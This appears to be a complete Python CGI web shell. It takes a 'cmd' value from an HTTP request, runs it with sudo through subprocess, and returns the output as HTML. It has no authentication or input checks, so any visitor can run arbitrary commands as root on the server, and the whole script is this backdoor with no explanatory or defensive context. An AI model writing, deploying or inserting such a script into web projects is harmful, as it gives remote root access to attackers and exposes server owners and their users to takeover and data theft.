#!/usr/bin/python3
import subprocess
import cgi

form = cgi.FieldStorage()
cmd = form.getvalue("cmd")

print("Content-type:text/html")
print("")

finalCommand = "sudo "+cmd
output = subprocess.getoutput(finalCommand)
print("<pre>")
print(output)
print("</pre>")
